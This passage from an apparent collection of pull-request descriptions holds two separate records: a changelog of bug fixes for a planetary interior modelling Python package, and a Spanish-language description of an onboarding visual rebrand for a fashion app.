### BuildTest / parallel-run fixes (`be26fd0c`)

- **Fix parallel inductogram convection failures**: use `np.isnan()` instead of `is np.nan` when filling `Planet.Ocean.etaMelt_Pas` / `Eact_kJmol` in `SetupInit` (pickled worker `Planet` objects were skipping the fill, leaving convection parameters NaN).
- **Lazy mkdir at write time** (`ensure_parent_dir` in `ResultsIO`); removed eager `makedirs` from `DataFilesSubstruct`; always build full `DataFilesSubstruct` even when `NO_SAVEFILE=True` (fixes inductogram save paths like `inductionData/_inductOgram.pkl`).
- **`LayerPropagators`**: guard empty `range(0)` index appends in `FindInnerWithMoIAndEOS`.
- **`Silicates`**: empty `indsSilValid` guard in no-core branch.
- **`MagneticInduction`**: `USE_INTERIOR_PROFILE_FOR_LAYERS` for sigma inductogram when `Planet.phase=None`.
- **`Convection.py`**: correct ice I TBL error messages (`Steps.nIceI`, not ice III / `nIceVLitho`).

---

### Packaging

- `pyproject.toml` / dependency updates for numpy v2 and integrated MoonMag.

author: rcoste
body:
Rebrand v3 (Gen-Z monocromo B&N) aplicado a **todo el onboarding**, en 5 incrementos sobre los tokens de Capa 1 ya en `main`. Mismo flujo y orden de navegación (`lib/onboarding.ts` sin tocar): género → gustos → colorimetría → clóset → objetivo → wow.

## Incrementos
1. **Género + objetivo** — selección+CTA, bordes rectos, íconos en cuadro (vestido/camisa nuevos), descripciones serif; fuera el slang "te late" → "¿te gusta?".
2. **Swipe + estilo reveal** — carta activa a color sobre B&N; reveal con **tríptico** de 3 looks amados.
3. **Colorimetría** — reskin D1 (dos estaciones); metal radial → **diagonal** (token en `globals.css` + `DESIGN.md`).
4. **Clóset** — tap-grid B1 "iluminar" (seleccionado a color, resto apagado) + chips de categoría; reemplaza el checklist.
5. **Wow** — regla de densidad global del `OutfitCard` (2-col ≤4 prendas / 3-col 5-6) + **reestructura del momento wow**:
   - **Estado 7 (elegir 1 de 3):** los 3 looks se revelan juntos en cards con radio de selección + corazón de favorito opcional + tira de prendas + porqué en serif; CTA sticky «empezar con X →».
   - **Estado 8 (modo Hoy):** el elegido abre con el mismo patrón que `ReadyView` de Hoy (header "hoy · nombre" + grid de densidad + "el toque" + "verme con este look ✦" + "otro look"/"me lo pongo"). "otro look" no regenera (vuelve a elegir entre los 3); "me lo pongo" marca worn y entra a `/hoy`.
   - **Avatar opcional:** "verme con este look" sin avatar abre `avatar-wizard`, al que se le añadió **"ahora no, seguir sin avatar"** (prop `skipHref`, cableado solo en onboarding → `/hoy`). El loading reusa `StylistGenerating` de Hoy.

Sin tocar backend; "elegir uno" es estado de UI (el motor ya genera 2-3 looks).

## Verificación
- **Pasada visual completa** del onboarding entero con test user fresco (`claude.dev`): los 9 estados renderizan y el flujo aterriza en la app. Capturas en cada paso.
- `vitest run` 15/15 ✓ · `tsc --noEmit` limpio ✓ · `eslint` limpio en todos los archivos de la rama ✓ · `next build` OK ✓.

## Hallazgos de la pasada (pre-existentes, fuera de scope — no en este PR)
- Arquetipo del estilo reveal sale en femenino para hombre ("te hace única"): el prompt en `lib/engine/archetype.ts` no recibe el género. (Tarea aparte.)
- Colorimetría ofrece opción "selfie" pero el análisis por selfie está fuera del MVP.
